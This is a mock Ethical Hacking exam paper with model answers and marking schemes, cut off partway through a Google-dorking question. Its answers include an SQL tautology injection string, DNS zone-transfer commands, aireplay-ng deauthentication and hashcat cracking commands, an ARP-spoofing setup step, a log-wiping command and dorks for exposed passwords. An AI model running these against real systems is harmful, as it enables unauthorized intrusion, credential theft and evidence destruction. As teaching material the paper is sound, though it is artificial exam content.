# End-Semester Examination Model Answers & Marking Scheme
## Subject: Ethical Hacking (MD***) — Full Mock Paper 1

**Course Code**: MD*** | **Subject**: Ethical Hacking  
**Duration**: 2 Hours (11:00 AM – 1:00 PM) | **Maximum Marks**: 60 Marks  

---

## SECTION A: Short Answer Conceptual Questions (Compulsory)
**Answer all 5 questions. Each question carries 4 marks.** (5 × 4 = 20 Marks)

---

### Q1. Core Cybersecurity Foundations & CIA Triad [4 Marks]

#### (a) Vulnerability, Threat, Exploit, and Cyber Risk [2 Marks]
* **Definitions**:
  1. **Vulnerability**: A structural weakness, software bug, administrative flaw, or misconfiguration in a system, network, or application that can be exploited by an adversary (e.g., buffer overflow, missing patch, default credentials).
  2. **Threat**: Any potential event, actor, or circumstance with the capability and intent to cause harm, unauthorized access, destruction, or exposure of information assets (e.g., black-hat hacker, malicious insider, ransomware syndicate).
  3. **Exploit**: A defined piece of code, automated script, weaponized payload, or operational technique crafted specifically to leverage an identified vulnerability to gain unauthorized privileges or execute arbitrary code.
* **Cyber Risk Relationship Formula**:
  $$\text{Risk} = \text{Threat} \times \text{Vulnerability} \times \text{Impact} \quad (\text{or Cost})$$
  *Alternatively expressed as:* $\text{Risk} = f(\text{Vulnerability}, \text{Threat}, \text{Asset Value} / \text{Countermeasures})$.
* **Concrete Real-World Example**:
  - *Vulnerability*: Unpatched Apache Struts parser flaw (`CVE-2017-5638`) parsing malicious `Content-Type` headers.
  - *Threat*: State-sponsored cyber threat actors scanning the public Internet for vulnerable web servers.
  - *Exploit*: Publicly available Python exploit script injecting OGNL expressions via HTTP headers to execute `/bin/sh`.
  - *Resulting Risk & Impact*: Total breach of 147 million consumer financial and PII credit records at Equifax.

#### (b) CIA Triad & Non-Repudiation [2 Marks]
* **CIA Triad Definitions**:
  1. **Confidentiality**: Ensuring that sensitive information is accessible only to authorized entities and shielded from eavesdropping or unauthorized disclosure (enforced by AES-256 encryption, access controls).
  2. **Integrity**: Guaranteeing the precision, consistency, authenticity, and untampered completeness of data throughout its lifecycle (enforced by SHA-256 hashes, digital signatures).
  3. **Availability**: Guaranteeing uninterrupted, timely, and reliable access to computing systems, services, and data for authorized users when required (enforced by redundant clustering, DDoS mitigation, RAID).
* **Non-Repudiation Definition**:
  - The security assurance that the author, sender, or party to an electronic transaction or message cannot falsely deny the authenticity of their signature, origination, or transmission of the data.
* **Cryptographic Mechanism**:
  - **Asymmetric Digital Signatures** (e.g., RSA-3072 or ECDSA using SHA-256). The sender signs a cryptographic hash of the message with their secret **Private Key**. Any verifier can validate the signature using the sender's public key, legally binding the signer because only the private key owner could produce that signature.

#### Marking Scheme (Q1)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Definitions & Risk Formula | Accurate definitions of V, T, E + correct Risk equation | 1.0 M |
| (a) Real-World Example | Complete real-world mapping (e.g., Struts / Equifax or MS17-010 / WannaCry) | 1.0 M |
| (b) CIA Triad Definitions | Concise, technically accurate definitions of C, I, and A | 1.0 M |
| (b) Non-Repudiation & Cryptography | Correct definition + explicit identification of Asymmetric Digital Signatures | 1.0 M |
| **Total for Q1** | | **4.0 M** |

---

### Q2. Reconnaissance & DNS Zone Transfers [4 Marks]

#### (a) Passive vs. Active Reconnaissance [2 Marks]
| Parameter | Passive Reconnaissance | Active Reconnaissance |
| :--- | :--- | :--- |
| **Direct Target Interaction** | **Zero direct contact** with the target infrastructure. Data is gathered from intermediate, public, or third-party repositories. | **Direct interaction** and packet exchange with the target's IP addresses, network devices, and service endpoints. |
| **Detection Surface (IDS/SIEM)** | **Completely undetectable** by the target organization's perimeter firewalls, IDS/IPS, or SIEM log analyzers. | **Highly detectable**; triggers alerts, firewall drop logs, and port scanning threshold detection. |
| **Typical Tools & Techniques** | WHOIS lookups, Google Dorking, Shodan, Censys, theHarvester, DNS public queries via Google 8.8.8.8. | Nmap port scanning, masscan, banner grabbing via Netcat, directory bruteforcing (Gobuster/Dirb), Nessus VA scans. |

#### (b) DNS Zone Transfer (AXFR) Mechanism & Security Risk [2 Marks]
* **Mechanism**:
  - DNS Zone Transfer (using query type `AXFR` over TCP port 53) is designed for master-slave DNS replication so secondary name servers keep identical zone data.
  - When a DNS server is misconfigured to permit unrestricted zone transfers from any arbitrary external IP address, an attacker querying for `AXFR` receives the complete database record set for that entire domain.
* **Security Risk**:
  - **Total Attack Surface Exposure**: Leaks every registered sub-domain, internal private IP addresses, mail exchange (`MX`) records, text verification tokens (`TXT`), host names, and staging/VPN infrastructure without sending a single scan packet to those endpoints.
* **Exact CLI Command**:
  ```bash
  # Using dig:
  dig @ns1.targetcorp.com targetcorp.com AXFR

  # Or using host:
  host -l targetcorp.com ns1.targetcorp.com
  ```

#### Marking Scheme (Q2)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Comparison Table | Clear differentiation across target contact, IDS visibility, and tooling | 2.0 M |
| (b) AXFR Mechanism & Risk | Technical explanation of DNS replication flaw and attack surface leakage | 1.0 M |
| (b) Exact CLI Command | Correct syntax for `dig ... AXFR` or `host -l ...` | 1.0 M |
| **Total for Q2** | | **4.0 M** |

---

### Q3. Password Attacks & Cryptographic Salting [4 Marks]

#### (a) Password Spraying vs. Credential Stuffing & Lockout Bypass [2 Marks]
* **Definitions**:
  1. **Password Spraying**: An horizontal online authentication attack where an adversary tests a **single common password** (e.g., `Welcome2026!`, `Summer2026!`) against hundreds or thousands of distinct corporate usernames or email addresses.
  2. **Credential Stuffing**: An automated attack where an adversary takes massive lists of pre-breached username/password pairs harvested from external leaks and replays them verbatim across unrelated target services, exploiting widespread user password reuse.
* **Why Password Spraying Bypasses Account Lockout Policies**:
  - Traditional lockout policies enforce a threshold like *"lock account after 3 or 5 consecutive failed login attempts on that specific username within 15 minutes"*.
  - Because password spraying attempts only **one single password per username** across the entire directory and sleeps before retrying, the per-account failed login count never reaches the lockout threshold, remaining completely stealthy to naive per-user lockout monitors.

#### (b) Cryptographic Salting & Rainbow Table Neutralization [2 Marks]
* **Definition of Salting**:
  - A salt is a unique, cryptographically secure pseudo-random bit string (minimum 16 bytes / 128 bits) generated independently for each user and concatenated with the plaintext password prior to hashing. The salt is stored in plaintext alongside the resulting hash.
* **Mathematical Formula**:
  $$\text{Stored\_Hash} = \text{Hash}(\text{Salt} \mathbin{\Vert} \text{Password}) \quad \text{where } \Vert \text{ denotes concatenation}$$
* **Rainbow Table Neutralization**:
  - A Rainbow Table is a precomputed lookup table mapping plaintext passwords to their hashes, trading storage space for near-instant hash reversal.
  - Rainbow tables rely on the deterministic property that identical passwords yield identical hash outputs ($\text{Hash}(P) \to H$).
  - When a unique random salt is applied to each account, two users with identical passwords (`password123`) generate completely different hash outputs:
    $$\text{Hash}(S_1 \mathbin{\Vert} P) \ne \text{Hash}(S_2 \mathbin{\Vert} P) \quad (\text{for } S_1 \ne S_2)$$
  - An attacker cannot reuse a precomputed table; they would have to precompute an entirely separate rainbow table for every individual user's salt ($2^{128}$ variations), making precomputation computationally and storage-wise impossible.

#### Marking Scheme (Q3)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Attack Definitions | Accurate distinction between Spraying (1 pwd/many users) & Stuffing (breached pairs) | 1.0 M |
| (a) Lockout Bypass Mechanism | Clear technical explanation of per-account failed attempt threshold avoidance | 1.0 M |
| (b) Salting Definition & Formula | Correct definition + mathematical concatenation formula | 1.0 M |
| (b) Rainbow Table Neutralization | Rigorous explanation of destroying deterministic precomputation | 1.0 M |
| **Total for Q3** | | **4.0 M** |

---

### Q4. Web Security: SQL Injection & XSS Typology [4 Marks]

#### (a) Tautology SQL Injection & Parameterized Query Defense [2 Marks]
* **Tautology SQL Injection Bypass**:
  - Vulnerable dynamic query:
    ```sql
    SELECT * FROM users WHERE username = '$user' AND password = '$pwd';
    ```
  - Input injected into `$user`: `' OR '1'='1' --`
  - Resulting evaluated query:
    ```sql
    SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = '...';
    ```
  - *Mechanism*: The single quote `'` breaks out of the string literal boundary. The boolean clause `'1'='1'` is a tautology (always evaluates to `TRUE`). The comment delimiter `--` truncates and comments out the remainder of the query (including the password check). The `WHERE` clause evaluates to `TRUE` for every row, returning the first account in the table (typically administrator `UID=1`).
* **Why Parameterized Prepared Statements Structurally Eliminate SQLi**:
  - Prepared statements enforce strict architectural separation between the **executable SQL code structure** and the **user data values**:
    1. The SQL query template (`SELECT * FROM users WHERE username = ? AND password = ?`) is sent to the database engine and pre-compiled into an Abstract Syntax Tree (AST).
    2. User inputs are transmitted separately as strictly bound parameters (literal strings).
    3. Even if the user submits `' OR '1'='1' --`, the database treats the entire string literally as a literal username value. It cannot alter the query syntax tree or change execution logic.

#### (b) Reflected XSS (Type I) vs. Stored XSS (Type II) [2 Marks]
| Parameter | Reflected XSS (Type I / Non-Persistent) | Stored XSS (Type II / Persistent) |
| :--- | :--- | :--- |
| **Persistence** | **Non-persistent**; the payload is not stored on the server or database. It reflects off the web server in an immediate HTTP response. | **Persistent**; the malicious payload is permanently stored in the server's backend database, filesystem, or comment storage. |
| **Delivery Vector** | Phishing email, malicious link, or shortened URL with payload embedded in URL query parameters (e.g., `?search=<script>...`). | Stored in public input fields: user comments, profile biographies, forum posts, product reviews, or message boards. |
| **Audience Impact** | **Targeted / Single-victim**: Only affects the specific user who actively clicks the crafted malicious link. | **Mass / Multi-victim**: Executes automatically in the browser of *every* subsequent user or administrator who views the infected page. |

#### Marking Scheme (Q4)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Tautology SQLi Mechanics | Step-by-step query parsing breakdown with quote escape and comment operator | 1.0 M |
| (a) Prepared Statement Defense | AST pre-compilation vs data parameter separation explanation | 1.0 M |
| (b) XSS Comparison | Accurate contrast across persistence, delivery mechanism, and audience impact | 2.0 M |
| **Total for Q4** | | **4.0 M** |

---

### Q5. VAPT Reporting & Windows Security Event Auditing [4 Marks]

#### (a) Executive Summary vs. Detailed Technical Findings [2 Marks]
| Dimension | Executive Summary | Detailed Technical Findings |
| :--- | :--- | :--- |
| **Target Audience** | C-level Executives (CISO, CEO, CTO, Board of Directors, Audit Committee). | Security Engineers, Developers, System Administrators, DevOps, SOC Analysts. |
| **Technical Depth** | **High-level, non-technical**: Business risk language, overall security posture metrics, compliance status, and strategic charts. | **Deeply technical**: Exact CVEs, CVSS v3.1 vector strings, protocol mechanics, code snippets, and terminal command traces. |
| **Primary Objective** | Justify security budget, communicate enterprise risk, guide strategic resource allocation, and ensure compliance. | Provide deterministic, step-by-step reproduction steps (PoC) and actionable remediation code fixes for engineering teams. |

#### (b) Windows Security Event IDs [2 Marks]
* **Event ID 4624**: An account was successfully logged on (contains Logon Type, e.g., Type 2 Interactive, Type 3 Network, Type 10 RemoteInteractive/RDP).
* **Event ID 4625**: An account failed to log on (records attempted username, workstation source, failure status code, e.g., `0xC000006A` wrong password).
* **Event ID 4720**: A new user account was created (critical for detecting unauthorized persistence or backdoor account creation).
* **Event ID Monitored for Brute-Force Attacks**:
  - **Event ID 4625** is monitored. A high frequency of Event ID 4625 within a short time window targeting a single user (brute-force) or across multiple users (password spraying) indicates an active attack.

#### Marking Scheme (Q5)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Report Sections Contrast | Correct contrast across audience, technical depth, and primary purpose | 2.0 M |
| (b) Event IDs 4624, 4625, 4720 | Exact definition of all 3 Windows event IDs | 1.5 M |
| (b) Brute-Force Identification | Explicitly identifies Event ID 4625 as the brute-force trigger | 0.5 M |
| **Total for Q5** | | **4.0 M** |

---

## SECTION B: Medium Analytical & Methodological Questions
**Answer any TWO questions from Q6, Q7, and Q8. Each carries 8 marks.** (2 × 8 = 16 Marks)

---

### Q6. Ethical Hacking Methodology & Nmap Scan Mechanics [8 Marks]

#### (a) CEH 5-Phase Ethical Hacking Methodology [4 Marks]
```
[1. Reconnaissance] ──► [2. Scanning & Enumeration] ──► [3. Gaining Access] ──► [4. Maintaining Access] ──► [5. Clearing Tracks / Reporting]
```

1. **Phase 1: Reconnaissance (Footprinting)**
   - *Technical Objective*: Gather intelligence and map the organizational footprint, network blocks, domain names, employee emails, and technological stack using passive OSINT and external sources.
   - *Black Hat vs. White Hat Distinction*: Black hats seek weak employee targets for social engineering and zero-day exposure without consent. Ethical hackers operate strictly within the mutually agreed **Scope of Work (SOW)** and predefined target assets defined in the authorization agreement.
2. **Phase 2: Scanning and Enumeration**
   - *Technical Objective*: Identify live hosts, open network ports, running service versions, OS signatures, and configuration vulnerabilities using tools like Nmap, Nessus, and OpenVAS.
   - *Black Hat vs. White Hat Distinction*: Black hats scan aggressively using unauthorized infrastructure (botnets, bulletproof proxies) without regard to service disruption. Ethical hackers scan from authorized test IP addresses and tune timing templates (e.g., `-T3`) to prevent causing unintended Denial of Service (DoS) to business operations.
3. **Phase 3: Gaining Access (Exploitation)**
   - *Technical Objective*: Exploit identified vulnerabilities (buffer overflows, injection flaws, default credentials) to penetrate the security perimeter and establish an unauthorized foothold.
   - *Black Hat vs. White Hat Distinction*: Black hats deploy malicious backdoors, exfiltrate private consumer data, and alter financial databases for personal gain. Ethical hackers exploit only with signed authorization, obtain minimal necessary Proof of Concept (PoC) evidence (e.g., executing `whoami` or `id`), and halt before damaging critical production databases.
4. **Phase 4: Maintaining Access (Persistence & Escalation)**
   - *Technical Objective*: Maintain long-term footholds on compromised systems, escalate privileges to Administrator/root, and pivot laterally across the internal subnet.
   - *Black Hat vs. White Hat Distinction*: Black hats plant rootkits, create hidden administrative accounts, and establish persistent Command & Control (C2) channels. Ethical hackers simulate lateral movement to measure architectural boundary controls, document every planted artifact, and ensure that test access tokens are strictly controlled and contained.
5. **Phase 5: Clearing Tracks vs. Reporting & Remediation**
   - *Critical Divergence*:
     - **Black Hat (Clearing Tracks)**: Deletes system audit event logs (`wevtutil cl System`), modifies log files (`/var/log/auth.log`), alters file timestamps (timestomping), installs rootkits to hide process IDs, and disguises ongoing persistence.
     - **Ethical Hacker (Reporting & Evidence Cleanup)**: Never deletes system logs. Cleans up all testing artifacts (deleting uploaded PoC scripts, removing test user accounts, terminating reverse shells). Prepares a comprehensive **VAPT Assessment Report** containing executive summaries, CVSS severity ratings, detailed technical findings, and actionable remediation steps.

#### (b) Nmap Port Scanning Mechanics [4 Marks]

##### 1. TCP Connect Scan (`-sT`) vs. TCP SYN Stealth Scan (`-sS`)
```
TCP Connect Scan (-sT) [Full 3-Way Handshake]:
Attacker                   Target
   |--------- SYN --------->|
   |<------ SYN-ACK --------|
   |--------- ACK --------->| (Connection Established & Logged in App Layer)
   |--------- RST-ACK ----->| (Graceful/Abrupt Teardown)

TCP SYN Stealth Scan (-sS) [Half-Open Handshake]:
Attacker                   Target
   |--------- SYN --------->|
   |<------ SYN-ACK --------|
   |--------- RST --------->| (Connection Torn Down BEFORE Completion - Not Logged)
```
- **TCP Connect (`-sT`)**: Uses the operating system's native `connect()` system call. Completes the full 3-way handshake (`SYN` $\to$ `SYN-ACK` $\to$ `ACK`). It does not require raw socket root privileges. However, the connection is fully completed and passed to the application layer, triggering connection log events in application logs (e.g., Apache/Nginx).
- **TCP SYN Scan (`-sS`)**: Known as "Half-Open" scanning. Attacker crafts raw IP packets, sending a `SYN`. When the target responds with `SYN-ACK`, the port is determined to be **Open**, and the attacker immediately responds with a `RST` packet to tear down the embryonic connection before completion. Because the connection is never completed, application-layer listeners never log the event, making it far stealthier. Requires root/administrator privileges.

##### 2. RFC 793 Inverse Scans (Null, FIN, Xmas) & Windows Non-Compliance
- **Scan Packet Flags**:
  - **Null Scan (`-sN`)**: No flags set (all flag bits = 0).
  - **FIN Scan (`-sF`)**: Only the `FIN` (Finish) flag is set.
  - **Xmas Scan (`-sX`)**: `FIN`, `PSH`, and `URG` flags are set ("lit up like a Christmas tree").
- **RFC 793 Logic**:
  - RFC 793 states: If a closed port receives any packet lacking `SYN`, `ACK`, or `RST`, it **must respond with a `RST`**. Conversely, if an **open port** receives such a packet, it must silently **drop and ignore** the packet.
  - *Result*: No response received $\implies$ Port is `Open|Filtered`. `RST` received $\implies$ Port is `Closed`.
- **Why Inverse Scans Fail on Windows**:
  - Microsoft's TCP/IP network stack does not strictly comply with RFC 793. Regardless of whether a port is open or closed, Microsoft Windows operating systems return a `RST` packet in response to any invalid flag combination. Consequently, all ports on Windows hosts appear `Closed`, rendering inverse scans completely ineffective against Windows targets.

##### 3. Primary Nmap Port States
- **Open**: A target application/service is actively listening on this port and accepting connections (received `SYN-ACK` in response to `SYN`).
- **Closed**: No application is listening on this port, but the host is accessible and responding (received `RST` in response to probe).
- **Filtered**: Nmap cannot determine whether the port is open because packet filtering (firewall, router ACL, IDS) is blocking probes or responses; packets are silently dropped without response or blocked via ICMP Type 3 error.

#### Marking Scheme (Q6)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) CEH 5-Phase Methodology | Complete sequential phases with clear technical goals | 2.0 M |
| (a) Black Hat vs Ethical Hacker | Clear, concrete ethical divergence across all phases | 2.0 M |
| (b.1) Connect vs SYN Scan | Accurate packet diagrams, handshake mechanics, and log differences | 1.5 M |
| (b.2) RFC 793 Inverse Scans | Logic breakdown (Open vs Closed) + Windows stack non-compliance explanation | 1.5 M |
| (b.3) Port States | Accurate definitions of Open, Closed, and Filtered states | 1.0 M |
| **Total for Q6** | | **8.0 M** |

---

### Q7. ARP Spoofing MITM & Firewall Architectures [8 Marks]

#### (a) Address Resolution Protocol (ARP) Vulnerability & MITM Attack [4 Marks]

##### 1. Architectural Flaw in ARP (RFC 826)
- **Stateless & Unauthenticated Design**: ARP lacks any authentication, message origin verification, or transaction state validation.
- **Gratuitous / Unsolicited Reply Acceptance**: Network hosts blindly accept unsolicited ARP replies and immediately overwrite their local dynamic ARP cache tables, even if they never issued an ARP request for that IP address.

##### 2. Step-by-Step Execution of ARP Spoofing MITM
```
Victim (192.168.1.10)       Attacker (192.168.1.50)       Gateway (192.168.1.1)
MAC: AA:AA:AA:AA:AA:AA      MAC: CC:CC:CC:CC:CC:CC        MAC: BB:BB:BB:BB:BB:BB
        |                             |                             |
        |  [Poisoning Frame 1]        |                             |
        |<== "192.168.1.1 is at CC" ==|                             |
        |                             |  [Poisoning Frame 2]        |
        |                             |== "192.168.1.10 is at CC" =>|
        |                             |                             |
        |===== Outgoing Traffic =====>|                             |
        |                             |===== Forwarded Traffic ====>|
        |                             |<==== Inbound Traffic =======|
        |<==== Forwarded Inbound =====|                             |
```
- **Step 1 (IP Forwarding)**: The attacker enables kernel packet forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`) so traffic is routed without dropping, maintaining connection transparency.
- **Step 2 (Victim Poisoning)**: Attacker sends continuous forged gratuitous ARP replies to the victim (`192.168.1.10`) claiming: *"192.168.1.1 is at CC:CC:CC:CC:CC:CC"*. The victim updates its ARP cache: Gateway IP $\to$ Attacker MAC.
- **Step 3 (Gateway Poisoning)**: Attacker sends forged gratuitous ARP replies to the default gateway (`192.168.1.1`) claiming: *"192.168.1.10 is at CC:CC:CC:CC:CC:CC"*. The gateway updates its cache: Victim IP $\to$ Attacker MAC.
- **Step 4 (MITM Interception)**: All outbound and inbound Ethernet frames are routed through the attacker's network card, allowing passive packet sniffing (Wireshark) or active payload manipulation (Ettercap / Bettercap).

##### 3. Dynamic ARP Inspection (DAI) Defense
- **How DAI Works**:
  - DAI is a Layer 2 security feature on enterprise managed switches that intercepts, logs, and discards ARP packets with invalid IP-to-MAC address bindings.
  - DAI inspects ARP packets against the **DHCP Snooping Binding Database** (which dynamically tracks leased IP addresses, validated MAC addresses, and physical switch port mappings).
  - If an unsolicited or conflicting ARP packet arrives on an **untrusted port** where the IP-to-MAC mapping does not match the database, the switch hardware immediately drops the packet and logs a security violation, neutralizing ARP poisoning at Layer 2.

#### (b) Network Security Controls & DMZ Architecture [4 Marks]

##### 1. Comparison of 4 Firewall Generations
| Generation | Architecture & OSI Layer | Inspection Mechanism | State Awareness & Limitations |
| :--- | :--- | :--- | :--- |
| **Gen 1: Packet Filtering** | Layer 3 (Network) & Layer 4 (Transport) | Inspects individual packet headers: Source IP, Dest IP, Protocol, Source/Dest Ports. | **Stateless**: Evaluates each packet in isolation. Vulnerable to IP spoofing; cannot inspect payload data. |
| **Gen 2: Stateful Inspection** | Layer 4 (Transport) & Layer 5 (Session) | Tracks TCP connection states (`SYN_SENT`, `ESTABLISHED`) in a dynamic state table. | **Stateful**: Automatically permits valid return traffic matching active sessions. Cannot inspect application content. |
| **Gen 3: Application Proxy** | Layer 7 (Application) | Acts as an intermediary terminating connections, inspecting full application payloads (HTTP, FTP). | **Full L7 Visibility**: Deep semantic inspection. High performance overhead and latency; protocol-specific. |
| **Gen 4: Next-Gen (NGFW)** | Layers 3 through 7 (Integrated) | Combines stateful inspection with Deep Packet Inspection (DPI), integrated IDS/IPS, TLS/SSL decryption, and user identity awareness. | **Context-Aware**: Identifies applications regardless of port (e.g., BitTorrent over port 80); enforces granular threat intelligence rules in real time. |

##### 2. Screened-Subnet DMZ Architecture
```
                           [ The Internet ]
                                  |
                        [ External Firewall ]
                                  |
              +-------------------+-------------------+
              |               DMZ Subnet              |
              |   [Web Server] [Mail Server] [DNS]    |
              +-------------------+-------------------+
                                  |
                        [ Internal Firewall ]
                                  |
              +-------------------+-------------------+
              |            Internal LAN               |
              |   [Active Directory] [Database Server]|
              +---------------------------------------+
```
- **Public Servers Located in the DMZ**: Web servers (HTTP/HTTPS), External Mail Gateways (SMTP), Public Recursive/Authoritative DNS servers, Reverse Proxies.
- **Fundamental Access Rule Governing DMZ-to-Internal LAN**:
  - **No traffic connection may ever be initiated from the DMZ into the Internal LAN**.
  - All communication sessions must originate from the Internal LAN towards the DMZ, or from the DMZ towards the external Internet. If a DMZ web application requires database access, the Internal Firewall allows *only* strictly restricted, unidirectional database queries (e.g., TCP port 1433/3306) to a designated internal DB host, dropping all other inbound connection requests.

#### Marking Scheme (Q7)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a.1) ARP Flaw | Architectural statelessness and gratuitous acceptance explanation | 1.0 M |
| (a.2) ARP Spoofing Execution | Step-by-step poisoning breakdown and packet redirection diagram | 2.0 M |
| (a.3) DAI Defense | DHCP snooping binding validation and packet drop mechanics | 1.0 M |
| (b.1) Firewall Generations | Complete comparison table across OSI layers, inspection, and state | 2.0 M |
| (b.2) DMZ Architecture | Clear dual-firewall diagram, correct server placement, and directional rule | 2.0 M |
| **Total for Q7** | | **8.0 M** |

---

### Q8. Wireless Security Evolution & Incident Response [8 Marks]

#### (a) Wireless Security Evolution & Handshake Attacks [4 Marks]

##### 1. Wi-Fi Security Protocol Comparison
| Protocol | Encryption Cipher | Integrity Mechanism | Key Length | Known Structural Vulnerabilities |
| :--- | :--- | :--- | :--- | :--- |
| **WEP** (802.11b) | RC4 (Stream cipher) | CRC-32 (Linear checksum) | 64-bit / 128-bit (24-bit IV) | 24-bit IV reuse, FMS/KoreK key recovery attacks in minutes, CRC-32 malleability. |
| **WPA** (802.11i draft)| RC4 (TKIP wrapper) | Michael MIC (64-bit) | 128-bit TKIP | Beck-Tews / Ohigashi-Kawano MIC recovery attacks; deprecated transitional cipher. |
| **WPA2** (802.11i) | AES-CCMP (Block cipher) | CBC-MAC | 128-bit AES | KRACK vulnerability; 4-Way Handshake susceptible to offline dictionary cracking via Deauth. |
| **WPA3** | AES-128 / AES-256 (GCMP) | GMAC (Galois MAC) | 128-bit / 192-bit | Dragonfly side-channel attacks (Dragonblood); structurally immune to offline dictionary attacks. |

##### 2. WPA2 4-Way Handshake & Deauthentication Capture
```
Access Point (AP)                                 Station (Client)
      |                                                  |
      |--------- 1. ANonce (Authenticator Nonce) ------->| [Client derives PTK using:
      |                                                  |  PMK, ANonce, SNonce,
      |                                                  |  AP MAC, Client MAC]
      |<-------- 2. SNonce (Supplicant Nonce) + MIC -----|
      |                                                  | [AP derives PTK & verifies MIC]
      |--------- 3. GTK (Group Key) + MIC -------------->|
      |                                                  |
      |<-------- 4. Final ACK ---------------------------|
```
- **Deauthentication Capture Execution**:
  1. An attacker places their wireless card into **Monitor Mode** (`airmon-ng start wlan0`) and listens on the target AP's channel.
  2. The attacker injects forged, unencrypted 802.11 **Deauthentication Frames** (`aireplay-ng --deauth 10 -a <AP_MAC> -c <Client_MAC> wlan0`) spoofing the AP's MAC address.
  3. The client workstation is instantly disconnected from the network.
  4. When the disconnected client automatically reconnects, it initiates the **4-Way Handshake**.
  5. The attacker captures Messages 1 and 2 (containing the `ANonce`, `SNonce`, MAC addresses, and cryptographic `MIC`) into a `.pcap` capture file.
  6. The attacker takes the capture offline and executes high-speed GPU dictionary attacks (`hashcat -m 22000`) testing candidate passwords against the captured MIC without alerting the target.

##### 3. How WPA3 Simultaneous Authentication of Equals (SAE) Neutralizes This
- WPA3 replaces the Pre-Shared Key (PSK) 4-Way Handshake exchange with **SAE (Dragonfly handshake)** based on zero-knowledge Diffie-Hellman proofs.
- During SAE authentication, passwords are used only to establish a shared curve point; candidate passwords are never directly validated against an intercepted static hash or MIC.
- An attacker cannot perform offline dictionary cracking on captured authentication exchanges because each authentication attempt requires active, synchronous participation with the AP (**Forward Secrecy**).

#### (b) Incident Response & Enterprise Ransomware Defense [4 Marks]

##### 1. NIST SP 800-61 Incident Response Lifecycle
```
+-------------------------------------------------------------------------------+
|                       1. Preparation                                          |
|         (Policies, toolsets, trained CSIRT team, hardened baselines)          |
+-------------------------------------------------------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------------------+
|                 2. Detection & Analysis (Triage)                             |
|          (SIEM alert correlation, IOC validation, scope definition)           |
+-------------------------------------------------------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------------------+
|       3. Containment, Eradication & Recovery                                  |
| (Isolate systems -> remove malware/backdoors -> restore from clean backups)   |
+-------------------------------------------------------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------------------+
|                     4. Post-Incident Activity                                 |
|            (Lessons learned, root cause analysis, playbook update)            |
+-------------------------------------------------------------------------------+
         ^                                                               |
         +---------------- Continuous Feedback Loop ---------------------+
```

##### 2. Active Enterprise Ransomware Response Actions
- **Short-Term Containment**:
  - **Immediate Network Isolation**: Physically unplug Ethernet cables and disable Wi-Fi/Bluetooth interfaces on all infected and adjacent endpoints.
  - **Switch Port & VLAN Quarantine**: Programmatically isolate affected switch ports or move compromised subnets to a black-hole quarantine VLAN.
  - **Disable Compromised Service Accounts**: Revoke active Kerberos tickets and reset passwords for compromised Active Directory accounts to halt automated lateral movement (via PsExec, WMI, or SMB).
  - **Block C2 Infrastructure**: Add adversary Command and Control (C2) IP addresses and malicious domains to perimeter firewall and DNS sinkhole blocklists.
- **Eradication**:
  - **Identify & Terminate Processes**: Kill ransomware execution binaries and persistent scheduled tasks across all endpoints.
  - **Remove Persistence Mechanisms**: Clean compromised registry run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`), malicious services, and WMI event subscriptions.
  - **Patch Exploited Root-Cause Vulnerability**: Apply emergency security updates (e.g., patching vulnerable SMB, RDP, or web gateway exploits) across the enterprise fleet.
- **Recovery**:
  - **Restore from Clean, Immutable Backups**: Restore file servers and databases from verified, write-once-read-many (WORM) or offsite offline backups validated to predate the breach.
  - **Rebuild Compromised Operating Systems**: Re-image affected physical and virtual hosts from golden master deployment images rather than relying on automated antivirus cleaning.
  - **Enhanced Monitoring**: Place restored systems under continuous 24/7 EDR (Endpoint Detection & Response) monitoring to verify absence of dormant persistence before reconnecting to the production network.

#### Marking Scheme (Q8)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a.1) Wireless Comparison Table | Comprehensive comparison across WEP, WPA, WPA2, and WPA3 | 1.5 M |
| (a.2) Deauth & Handshake Cracking | 4-way handshake flow + deauth injection mechanics + offline cracking | 1.5 M |
| (a.3) WPA3 SAE Defense | Zero-knowledge Dragonfly proof and elimination of offline cracking | 1.0 M |
| (b.1) NIST SP 800-61 Lifecycle | 4 sequential phases diagram and clear continuous improvement loop | 1.5 M |
| (b.2) Ransomware Action Plan | Concrete, prioritized actions across Containment, Eradication, Recovery | 2.5 M |
| **Total for Q8** | | **8.0 M** |

---

## SECTION C: Comprehensive Scenario & Applied Design Questions
**Answer any TWO questions from Q9, Q10, and Q11. Each carries 12 marks.** (2 × 12 = 24 Marks)

---

### Q9. External Web Assessment, Web App Security & Indian Cyber Law [12 Marks]

#### (a) Reconnaissance, OSINT & Google Dorking [4 Marks]
* **Passive Reconnaissance Architecture for `ebank.corp.com`**:
  1. *Subdomain Enumeration*: Query Certificate Transparency logs (`crt.sh?q=%.corp.com`) and DNS aggregators (Amass, Sublist3r) to locate dev/staging endpoints (`dev-api.corp.com`, `vpn.corp.com`).
  2. *Tech Stack Fingerprinting*: Query BuiltWith and Wappalyzer to map web servers, frontend frameworks, and cloud providers.
  3. *Cloud Asset Discovery*: Scan public S3/Blob storage namespaces for bucket names containing `ebank-backup`, `corp-assets`.
* **4 Concrete Google Dorks**:
  1. *Exposed Database Backups & SQL Dumps*:
     ```text
     site:ebank.corp.com filetype:sql OR filetype:dump OR filetype:bkp "CREATE TABLE"
     ```
  2. *Exposed Administrative Portals & Dashboards*:
     ```text
     site:ebank.corp.com inurl:admin OR inurl:login OR inurl:portal intitle:"Admin Login"
     ```
  3. *Exposed Environment Variables & API Secrets*:
     ```text
     site:ebank.corp.com filetype:env OR filetype:ini "DB_PASSWORD" OR "SECRET_KEY"
     ```
  4. *Exposed Server Status & Diagnostic Interfaces*:
     ```text
     site:ebank.corp.com inurl:/server-status OR inurl:/phpinfo.php "Apache Status"
     ```
* **Why Relying on `robots.txt` for Security is a Misconception**:
  - `robots.txt` is an **advisory exclusion standard for cooperative search crawlers**, not an access control mechanism.
